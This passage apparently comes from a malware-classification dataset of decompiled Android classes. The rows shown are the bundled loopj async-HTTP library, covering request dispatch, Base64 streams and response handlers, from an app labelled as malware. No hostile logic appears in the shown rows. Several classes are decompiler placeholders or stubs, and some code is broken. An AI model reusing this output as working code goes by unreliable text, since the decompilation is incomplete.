cancelRequests"");       return;     }     Runnable runnable=new Runnable(){       @Override public void run(){         List list=(List)AsyncHttpClient.this.requestMap.get(context);         if (list != null) {           Iterator it=list.iterator();           while (it.hasNext()) {             ((RequestHandle)it.next()).cancel(z);           }           AsyncHttpClient.this.requestMap.remove(context);         }       }     } ;     if (Looper.myLooper() == Looper.getMainLooper()) {       new Thread(runnable).start();     }  else {       runnable.run();     }   }   public void clearBasicAuth(){     this.httpClient.getCredentialsProvider().clear();   }   public RequestHandle delete(  Context context,  String str,  ResponseHandlerInterface responseHandlerInterface){     return sendRequest(this.httpClient,this.httpContext,new HttpDelete(URI.create(str).normalize()),null,responseHandlerInterface,context);   }   public RequestHandle delete(  Context context,  String str,  Header[] headerArr,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     HttpDelete httpDelete=new HttpDelete(getUrlWithQueryString(this.isUrlEncodingEnabled,str,requestParams));     if (headerArr != null) {       httpDelete.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,httpDelete,null,responseHandlerInterface,context);   }   public RequestHandle delete(  Context context,  String str,  Header[] headerArr,  ResponseHandlerInterface responseHandlerInterface){     HttpDelete httpDelete=new HttpDelete(URI.create(str).normalize());     if (headerArr != null) {       httpDelete.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,httpDelete,null,responseHandlerInterface,context);   }   public RequestHandle delete(  String str,  ResponseHandlerInterface responseHandlerInterface){     return delete(null,str,responseHandlerInterface);   }   public RequestHandle get(  Context context,  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return sendRequest(this.httpClient,this.httpContext,new HttpGet(getUrlWithQueryString(this.isUrlEncodingEnabled,str,requestParams)),null,responseHandlerInterface,context);   }   public RequestHandle get(  Context context,  String str,  ResponseHandlerInterface responseHandlerInterface){     return get(context,str,null,responseHandlerInterface);   }   public RequestHandle get(  Context context,  String str,  Header[] headerArr,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     HttpGet httpGet=new HttpGet(getUrlWithQueryString(this.isUrlEncodingEnabled,str,requestParams));     if (headerArr != null) {       httpGet.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,httpGet,null,responseHandlerInterface,context);   }   public RequestHandle get(  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return get(null,str,requestParams,responseHandlerInterface);   }   public RequestHandle get(  String str,  ResponseHandlerInterface responseHandlerInterface){     return get(null,str,null,responseHandlerInterface);   }   protected ExecutorService getDefaultThreadPool(){     return Executors.newCachedThreadPool();   }   public HttpClient getHttpClient(){     return this.httpClient;   }   public HttpContext getHttpContext(){     return this.httpContext;   }   public int getMaxConnections(){     return this.maxConnections;   }   public ExecutorService getThreadPool(){     return this.threadPool;   }   public int getTimeout(){     return this.timeout;   }   public RequestHandle head(  Context context,  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return sendRequest(this.httpClient,this.httpContext,new HttpHead(getUrlWithQueryString(this.isUrlEncodingEnabled,str,requestParams)),null,responseHandlerInterface,context);   }   public RequestHandle head(  Context context,  String str,  ResponseHandlerInterface responseHandlerInterface){     return head(context,str,null,responseHandlerInterface);   }   public RequestHandle head(  Context context,  String str,  Header[] headerArr,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     HttpHead httpHead=new HttpHead(getUrlWithQueryString(this.isUrlEncodingEnabled,str,requestParams));     if (headerArr != null) {       httpHead.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,httpHead,null,responseHandlerInterface,context);   }   public RequestHandle head(  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return head(null,str,requestParams,responseHandlerInterface);   }   public RequestHandle head(  String str,  ResponseHandlerInterface responseHandlerInterface){     return head(null,str,null,responseHandlerInterface);   }   public boolean isUrlEncodingEnabled(){     return this.isUrlEncodingEnabled;   }   public AsyncHttpRequest newAsyncHttpRequest(  DefaultHttpClient defaultHttpClient,  HttpContext httpContext,  HttpUriRequest httpUriRequest,  String str,  ResponseHandlerInterface responseHandlerInterface,  Context context){     return new AsyncHttpRequest(defaultHttpClient,httpContext,httpUriRequest,responseHandlerInterface);   }   public RequestHandle post(  Context context,  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return post(context,str,paramsToEntity(requestParams,responseHandlerInterface),null,responseHandlerInterface);   }   public RequestHandle post(  Context context,  String str,  HttpEntity httpEntity,  String str2,  ResponseHandlerInterface responseHandlerInterface){     return sendRequest(this.httpClient,this.httpContext,addEntityToRequestBase(new HttpPost(URI.create(str).normalize()),httpEntity),str2,responseHandlerInterface,context);   }   public RequestHandle post(  Context context,  String str,  Header[] headerArr,  RequestParams requestParams,  String str2,  ResponseHandlerInterface responseHandlerInterface){     HttpPost httpPost=new HttpPost(URI.create(str).normalize());     if (requestParams != null) {       httpPost.setEntity(paramsToEntity(requestParams,responseHandlerInterface));     }     if (headerArr != null) {       httpPost.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,httpPost,str2,responseHandlerInterface,context);   }   public RequestHandle post(  Context context,  String str,  Header[] headerArr,  HttpEntity httpEntity,  String str2,  ResponseHandlerInterface responseHandlerInterface){     HttpEntityEnclosingRequestBase addEntityToRequestBase=addEntityToRequestBase(new HttpPost(URI.create(str).normalize()),httpEntity);     if (headerArr != null) {       addEntityToRequestBase.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,addEntityToRequestBase,str2,responseHandlerInterface,context);   }   public RequestHandle post(  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return post(null,str,requestParams,responseHandlerInterface);   }   public RequestHandle post(  String str,  ResponseHandlerInterface responseHandlerInterface){     return post(null,str,null,responseHandlerInterface);   }   public RequestHandle put(  Context context,  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return put(context,str,paramsToEntity(requestParams,responseHandlerInterface),null,responseHandlerInterface);   }   public RequestHandle put(  Context context,  String str,  HttpEntity httpEntity,  String str2,  ResponseHandlerInterface responseHandlerInterface){     return sendRequest(this.httpClient,this.httpContext,addEntityToRequestBase(new HttpPut(URI.create(str).normalize()),httpEntity),str2,responseHandlerInterface,context);   }   public RequestHandle put(  Context context,  String str,  Header[] headerArr,  HttpEntity httpEntity,  String str2,  ResponseHandlerInterface responseHandlerInterface){     HttpEntityEnclosingRequestBase addEntityToRequestBase=addEntityToRequestBase(new HttpPut(URI.create(str).normalize()),httpEntity);     if (headerArr != null) {       addEntityToRequestBase.setHeaders(headerArr);     }     return sendRequest(this.httpClient,this.httpContext,addEntityToRequestBase,str2,responseHandlerInterface,context);   }   public RequestHandle put(  String str,  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     return put(null,str,requestParams,responseHandlerInterface);   }   public RequestHandle put(  String str,  ResponseHandlerInterface responseHandlerInterface){     return put(null,str,null,responseHandlerInterface);   }   public void removeAllHeaders(){     this.clientHeaderMap.clear();   }   public void removeHeader(  String str){     this.clientHeaderMap.remove(str);   }   protected RequestHandle sendRequest(  DefaultHttpClient defaultHttpClient,  HttpContext httpContext,  HttpUriRequest httpUriRequest,  String str,  ResponseHandlerInterface responseHandlerInterface,  Context context){     if (httpUriRequest == null) {       throw new IllegalArgumentException(""HttpUriRequest must not be null"");     }     if (responseHandlerInterface == null) {       throw new IllegalArgumentException(""ResponseHandler must not be null"");     }     if (responseHandlerInterface.getUseSynchronousMode()) {       throw new IllegalArgumentException(""Synchronous ResponseHandler used in AsyncHttpClient. You should create your response handler in a looper thread or use SyncHttpClient instead."");     }     if (str != null) {       httpUriRequest.setHeader(""Content-Type"",str);     }     responseHandlerInterface.setRequestHeaders(httpUriRequest.getAllHeaders());     responseHandlerInterface.setRequestURI(httpUriRequest.getURI());     AsyncHttpRequest newAsyncHttpRequest=newAsyncHttpRequest(defaultHttpClient,httpContext,httpUriRequest,str,responseHandlerInterface,context);     this.threadPool.submit(newAsyncHttpRequest);     RequestHandle requestHandle=new RequestHandle(newAsyncHttpRequest);     if (context != null) {       List<RequestHandle> list=this.requestMap.get(context); synchronized (this.requestMap) {         if (list == null) {           list=Collections.synchronizedList(new LinkedList());           this.requestMap.put(context,list);         }       }       if (responseHandlerInterface instanceof RangeFileAsyncHttpResponseHandler) {         ((RangeFileAsyncHttpResponseHandler)responseHandlerInterface).updateRequestHeaders(httpUriRequest);       }       list.add(requestHandle);       Iterator<RequestHandle> it=list.iterator();       while (it.hasNext()) {         if (it.next().shouldBeGarbageCollected()) {           it.remove();         }       }     }     return requestHandle;   }   public void setAuthenticationPreemptive(  boolean z){     if (z) {       this.httpClient.addRequestInterceptor(new PreemtiveAuthorizationHttpRequestInterceptor(),0);     }  else {       this.httpClient.removeRequestInterceptorByClass(PreemtiveAuthorizationHttpRequestInterceptor.class);     }   }   public void setBasicAuth(  String str,  String str2){     setBasicAuth(str,str2,false);   }   public void setBasicAuth(  String str,  String str2,  AuthScope authScope){     setBasicAuth(str,str2,authScope,false);   }   public void setBasicAuth(  String str,  String str2,  AuthScope authScope,  boolean z){     UsernamePasswordCredentials usernamePasswordCredentials=new UsernamePasswordCredentials(str,str2);     CredentialsProvider credentialsProvider=this.httpClient.getCredentialsProvider();     if (authScope == null) {       authScope=AuthScope.ANY;     }     credentialsProvider.setCredentials(authScope,usernamePasswordCredentials);     setAuthenticationPreemptive(z);   }   public void setBasicAuth(  String str,  String str2,  boolean z){     setBasicAuth(str,str2,null,z);   }   public void setCookieStore(  CookieStore cookieStore){     this.httpContext.setAttribute(""http.cookie-store"",cookieStore);   }   public void setEnableRedirects(  boolean z){     setEnableRedirects(z,z,z);   }   public void setEnableRedirects(  boolean z,  boolean z2){     setEnableRedirects(z,z2,true);   }   public void setEnableRedirects(  boolean z,  boolean z2,  boolean z3){     this.httpClient.getParams().setBooleanParameter(""http.protocol.reject-relative-redirect"",!z2);     this.httpClient.getParams().setBooleanParameter(""http.protocol.allow-circular-redirects"",z3);     this.httpClient.setRedirectHandler(new MyRedirectHandler(z));   }   public void setMaxConnections(  int i){     if (i < 1) {       i=10;     }     this.maxConnections=i;     ConnManagerParams.setMaxConnectionsPerRoute(this.httpClient.getParams(),new ConnPerRouteBean(this.maxConnections));   }   public void setMaxRetriesAndTimeout(  int i,  int i2){     this.httpClient.setHttpRequestRetryHandler(new RetryHandler(i,i2));   }   public void setProxy(  String str,  int i){     this.httpClient.getParams().setParameter(""http.route.default-proxy"",new HttpHost(str,i));   }   public void setProxy(  String str,  int i,  String str2,  String str3){     this.httpClient.getCredentialsProvider().setCredentials(new AuthScope(str,i),new UsernamePasswordCredentials(str2,str3));     this.httpClient.getParams().setParameter(""http.route.default-proxy"",new HttpHost(str,i));   }   public void setRedirectHandler(  RedirectHandler redirectHandler){     this.httpClient.setRedirectHandler(redirectHandler);   }   public void setSSLSocketFactory(  SSLSocketFactory sSLSocketFactory){     this.httpClient.getConnectionManager().getSchemeRegistry().register(new Scheme(""https"",sSLSocketFactory,443));   }   public void setThreadPool(  ExecutorService executorService){     this.threadPool=executorService;   }   public void setTimeout(  int i){     if (i < 1000) {       i=DEFAULT_SOCKET_TIMEOUT;     }     this.timeout=i;     HttpParams params=this.httpClient.getParams();     ConnManagerParams.setTimeout(params,this.timeout);     HttpConnectionParams.setSoTimeout(params,this.timeout);     HttpConnectionParams.setConnectionTimeout(params,this.timeout);   }   public void setURLEncodingEnabled(  boolean z){     this.isUrlEncodingEnabled=z;   }   public void setUserAgent(  String str){     HttpProtocolParams.setUserAgent(this.httpClient.getParams(),str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\AsyncHttpRequest.code","public class AsyncHttpRequest implements Runnable {   private final AbstractHttpClient client;   private final HttpContext context;   private int executionCount;   private final HttpUriRequest request;   private final ResponseHandlerInterface responseHandler;   private boolean isCancelled=false;   private boolean cancelIsNotified=false;   private boolean isFinished=false;   public AsyncHttpRequest(  AbstractHttpClient abstractHttpClient,  HttpContext httpContext,  HttpUriRequest httpUriRequest,  ResponseHandlerInterface responseHandlerInterface){     this.client=abstractHttpClient;     this.context=httpContext;     this.request=httpUriRequest;     this.responseHandler=responseHandlerInterface;   }   private void makeRequest(){     if (isCancelled()) {       return;     }     if (this.request.getURI().getScheme() == null) {       throw new MalformedURLException(""No valid URI scheme was provided"");     }     HttpResponse execute=this.client.execute(this.request,this.context);     if (isCancelled() || this.responseHandler == null) {       return;     }     this.responseHandler.sendResponseMessage(execute);   }   private void makeRequestWithRetries(){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.com.loopj.android.http.AsyncHttpRequest.makeRequestWithRetries():void"");   }   private synchronized void sendCancelNotification(){     if (!this.isFinished && this.isCancelled && !this.cancelIsNotified) {       this.cancelIsNotified=true;       if (this.responseHandler != null) {         this.responseHandler.sendCancelMessage();       }     }   }   public boolean cancel(  boolean z){     this.isCancelled=true;     this.request.abort();     return isCancelled();   }   public boolean isCancelled(){     if (this.isCancelled) {       sendCancelNotification();     }     return this.isCancelled;   }   public boolean isDone(){     return isCancelled() || this.isFinished;   }   @Override public void run(){     if (isCancelled()) {       return;     }     if (this.responseHandler != null) {       this.responseHandler.sendStartMessage();     }     if (isCancelled()) {       return;     }     try {       makeRequestWithRetries();     }  catch (    IOException e) {       if (isCancelled() || this.responseHandler == null) {         Log.e(""AsyncHttpRequest"",""makeRequestWithRetries returned error, but handler is null"",e);       }  else {         this.responseHandler.sendFailureMessage(0,null,null,e);       }     }     if (isCancelled()) {       return;     }     if (this.responseHandler != null) {       this.responseHandler.sendFinishMessage();     }     this.isFinished=true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\AsyncHttpResponseHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@448dad8"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Base64.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1b53a693"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Base64DataException.code","public class Base64DataException extends IOException {   public Base64DataException(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Base64OutputStream.code","public class Base64OutputStream extends FilterOutputStream {   private static byte[] EMPTY=new byte[0];   private int bpos;   private byte[] buffer;   private final Base64.Coder coder;   private final int flags;   public Base64OutputStream(  OutputStream outputStream,  int i){     this(outputStream,i,true);   }   public Base64OutputStream(  OutputStream outputStream,  int i,  boolean z){     super(outputStream);     this.buffer=null;     this.bpos=0;     this.flags=i;     if (z) {       this.coder=new Base64.Encoder(i,null);     }  else {       this.coder=new Base64.Decoder(i,null);     }   }   private byte[] embiggen(  byte[] bArr,  int i){     return (bArr == null || bArr.length < i) ? new byte[i] : bArr;   }   private void flushBuffer(){     if (this.bpos > 0) {       internalWrite(this.buffer,0,this.bpos,false);       this.bpos=0;     }   }   private void internalWrite(  byte[] bArr,  int i,  int i2,  boolean z){     this.coder.output=embiggen(this.coder.output,this.coder.maxOutputSize(i2));     if (!this.coder.process(bArr,i,i2,z)) {       throw new Base64DataException(""bad base-64"");     }     this.out.write(this.coder.output,0,this.coder.op);   }   @Override public void close(){     IOException iOException=null;     try {       flushBuffer();       internalWrite(EMPTY,0,0,true);     }  catch (    IOException e) {       iOException=e;     }     try {       if ((this.flags & 16) == 0) {         this.out.close();       }  else {         this.out.flush();       }       e=iOException;     }  catch (    IOException e2) {       e=e2;       if (iOException == null) {         e=iOException;       }     }     if (e != null) {       throw e;     }   }   @Override public void write(  int i){     if (this.buffer == null) {       this.buffer=new byte[1024];     }     if (this.bpos >= this.buffer.length) {       internalWrite(this.buffer,0,this.bpos,false);       this.bpos=0;     }     byte[] bArr=this.buffer;     int i2=this.bpos;     this.bpos=i2 + 1;     bArr[i2]=(byte)i;   }   @Override public void write(  byte[] bArr,  int i,  int i2){     if (i2 <= 0) {       return;     }     flushBuffer();     internalWrite(bArr,i,i2,false);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\BaseJsonHttpResponseHandler.code","public abstract class BaseJsonHttpResponseHandler<JSON_TYPE> extends TextHttpResponseHandler {   private static final String LOG_TAG=""BaseJsonHttpResponseHandler"";   public BaseJsonHttpResponseHandler(){     this(AsyncHttpResponseHandler.DEFAULT_CHARSET);   }   public BaseJsonHttpResponseHandler(  String str){     super(str);   }   @Override public final void onFailure(  final int i,  final Header[] headerArr,  final String str,  final Throwable th){     if (str == null) {       onFailure(i,headerArr,th,null,null);       return;     }     Runnable runnable=new Runnable(){       @Override public void run(){         try {           final Object parseResponse=BaseJsonHttpResponseHandler.this.parseResponse(str,true);           BaseJsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               BaseJsonHttpResponseHandler.this.onFailure(i,headerArr,th,str,parseResponse);             }           } );         }  catch (        Throwable th2) {           Log.d(BaseJsonHttpResponseHandler.LOG_TAG,""parseResponse thrown an problem"",th2);           BaseJsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               BaseJsonHttpResponseHandler.this.onFailure(i,headerArr,th,str,null);             }           } );         }       }     } ;     if (getUseSynchronousMode()) {       runnable.run();     }  else {       new Thread(runnable).start();     }   }   public abstract void onFailure(  int i,  Header[] headerArr,  Throwable th,  String str,  JSON_TYPE json_type);   @Override public final void onSuccess(  final int i,  final Header[] headerArr,  final String str){     if (i == 204) {       onSuccess(i,headerArr,null,null);       return;     }     Runnable runnable=new Runnable(){       @Override public void run(){         try {           final Object parseResponse=BaseJsonHttpResponseHandler.this.parseResponse(str,false);           BaseJsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               BaseJsonHttpResponseHandler.this.onSuccess(i,headerArr,str,parseResponse);             }           } );         }  catch (        Throwable th) {           Log.d(BaseJsonHttpResponseHandler.LOG_TAG,""parseResponse thrown an problem"",th);           BaseJsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               BaseJsonHttpResponseHandler.this.onFailure(i,headerArr,th,str,null);             }           } );         }       }     } ;     if (getUseSynchronousMode()) {       runnable.run();     }  else {       new Thread(runnable).start();     }   }   public abstract void onSuccess(  int i,  Header[] headerArr,  String str,  JSON_TYPE json_type);   protected abstract JSON_TYPE parseResponse(  String str,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\BinaryHttpResponseHandler.code","public abstract class BinaryHttpResponseHandler extends AsyncHttpResponseHandler {   private static final String LOG_TAG=""BinaryHttpResponseHandler"";   private String[] mAllowedContentTypes;   public BinaryHttpResponseHandler(){     this.mAllowedContentTypes=new String[]{RequestParams.APPLICATION_OCTET_STREAM,""image/jpeg"",""image/png"",""image/gif""};   }   public BinaryHttpResponseHandler(  String[] strArr){     this.mAllowedContentTypes=new String[]{RequestParams.APPLICATION_OCTET_STREAM,""image/jpeg"",""image/png"",""image/gif""};     if (strArr != null) {       this.mAllowedContentTypes=strArr;     }  else {       Log.e(LOG_TAG,""Constructor passed allowedContentTypes was null !"");     }   }   public String[] getAllowedContentTypes(){     return this.mAllowedContentTypes;   }   @Override public abstract void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th);   @Override public abstract void onSuccess(  int i,  Header[] headerArr,  byte[] bArr);   @Override public final void sendResponseMessage(  HttpResponse httpResponse){     boolean z=false;     StatusLine statusLine=httpResponse.getStatusLine();     Header[] headers=httpResponse.getHeaders(""Content-Type"");     if (headers.length != 1) {       sendFailureMessage(statusLine.getStatusCode(),httpResponse.getAllHeaders(),null,new HttpResponseException(statusLine.getStatusCode(),""None, or more than one, Content-Type Header found!""));       return;     }     Header header=headers[0];     for (    String str : getAllowedContentTypes()) {       try {         if (Pattern.matches(str,header.getValue())) {           z=true;         }       }  catch (      PatternSyntaxException e) {         Log.e(LOG_TAG,""Given pattern is not valid: "" + str,e);       }     }     if (z) {       super.sendResponseMessage(httpResponse);     }  else {       sendFailureMessage(statusLine.getStatusCode(),httpResponse.getAllHeaders(),null,new HttpResponseException(statusLine.getStatusCode(),""Content-Type not allowed!""));     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Coder.code","public abstract class Coder {   public int op;   public byte[] output;   Coder(){   }   public abstract int maxOutputSize(  int i);   public abstract boolean process(  byte[] bArr,  int i,  int i2,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\DataAsyncHttpResponseHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6850cd63"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Decoder.code","public class Decoder extends Coder {   private static final int[] DECODE={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private static final int[] DECODE_WEBSAFE={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,63,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};   private static final int EQUALS=-2;   private static final int SKIP=-1;   private final int[] alphabet;   private int state;   private int value;   public Decoder(  int i,  byte[] bArr){     this.output=bArr;     this.alphabet=(i & 8) == 0 ? DECODE : DECODE_WEBSAFE;     this.state=0;     this.value=0;   }   @Override public int maxOutputSize(  int i){     return ((i * 3) / 4) + 10;   }   @Override public boolean process(  byte[] r11,  int r12,  int r13,  boolean r14){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.com.loopj.android.http.Base64.Decoder.process(byte[], int, int, boolean):boolean"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\Encoder.code","!org.eclipse.jdt.core.dom.TypeDeclaration@589cb9ec"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\FileAsyncHttpResponseHandler.code","public abstract class FileAsyncHttpResponseHandler extends AsyncHttpResponseHandler {   static final boolean $assertionsDisabled;   private static final String LOG_TAG=""FileAsyncHttpResponseHandler"";   protected final File mFile; static {     $assertionsDisabled=!FileAsyncHttpResponseHandler.class.desiredAssertionStatus() ? true : $assertionsDisabled;   }   public FileAsyncHttpResponseHandler(  Context context){     this.mFile=getTemporaryFile(context);   }   public FileAsyncHttpResponseHandler(  File file){     if (!$assertionsDisabled && file == null) {       throw new AssertionError();     }     this.mFile=file;   }   public boolean deleteTargetFile(){     if (getTargetFile() == null || !getTargetFile().delete()) {       return $assertionsDisabled;     }     return true;   }   @Override protected byte[] getResponseData(  HttpEntity httpEntity){     int i=0;     if (httpEntity == null) {       return null;     }     InputStream content=httpEntity.getContent();     long contentLength=httpEntity.getContentLength();     FileOutputStream fileOutputStream=new FileOutputStream(getTargetFile());     if (content == null) {       return null;     }     try {       byte[] bArr=new byte[4096];       while (true) {         int read=content.read(bArr);         if (read == -1 || Thread.currentThread().isInterrupted()) {           break;         }         i+=read;         fileOutputStream.write(bArr,0,read);         sendProgressMessage(i,(int)contentLength);       }       return null;     }   finally {       AsyncHttpClient.silentCloseInputStream(content);       fileOutputStream.flush();       AsyncHttpClient.silentCloseOutputStream(fileOutputStream);     }   }   public File getTargetFile(){     if ($assertionsDisabled || this.mFile != null) {       return this.mFile;     }     throw new AssertionError();   }   protected File getTemporaryFile(  Context context){     if (!$assertionsDisabled && context == null) {       throw new AssertionError();     }     try {       return File.createTempFile(""temp_"",""_handled"",context.getCacheDir());     }  catch (    IOException e) {       Log.e(LOG_TAG,""Cannot create temporary file"",e);       return null;     }   }   public abstract void onFailure(  int i,  Header[] headerArr,  Throwable th,  File file);   @Override public final void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     onFailure(i,headerArr,th,getTargetFile());   }   public abstract void onSuccess(  int i,  Header[] headerArr,  File file);   @Override public final void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     onSuccess(i,headerArr,getTargetFile());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\FilePart.code","public class FilePart {   public File file;   public byte[] header;   public FilePart(  String str,  File file,  String str2){     this.header=createHeader(str,file.getName(),str2);     this.file=file;   }   private byte[] createHeader(  String str,  String str2,  String str3){     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     try {       byteArrayOutputStream.write(SimpleMultipartEntity.this.boundaryLine);       byteArrayOutputStream.write(SimpleMultipartEntity.this.createContentDisposition(str,str2));       byteArrayOutputStream.write(SimpleMultipartEntity.this.createContentType(str3));       byteArrayOutputStream.write(SimpleMultipartEntity.TRANSFER_ENCODING_BINARY);       byteArrayOutputStream.write(SimpleMultipartEntity.CR_LF);     }  catch (    IOException e) {       Log.e(SimpleMultipartEntity.LOG_TAG,""createHeader ByteArrayOutputStream exception"",e);     }     return byteArrayOutputStream.toByteArray();   }   public long getTotalLength(){     return this.file.length() + SimpleMultipartEntity.CR_LF.length + this.header.length;   }   public void writeTo(  OutputStream outputStream){     outputStream.write(this.header);     SimpleMultipartEntity.this.updateProgress(this.header.length);     FileInputStream fileInputStream=new FileInputStream(this.file);     byte[] bArr=new byte[4096];     while (true) {       int read=fileInputStream.read(bArr);       if (read == -1) {         outputStream.write(SimpleMultipartEntity.CR_LF);         SimpleMultipartEntity.this.updateProgress(SimpleMultipartEntity.CR_LF.length);         outputStream.flush();         AsyncHttpClient.silentCloseInputStream(fileInputStream);         return;       }       outputStream.write(bArr,0,read);       SimpleMultipartEntity.this.updateProgress(read);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\FileWrapper.code","public class FileWrapper {   public final String contentType;   public final File file;   public FileWrapper(  File file,  String str){     this.file=file;     this.contentType=str;   } } "
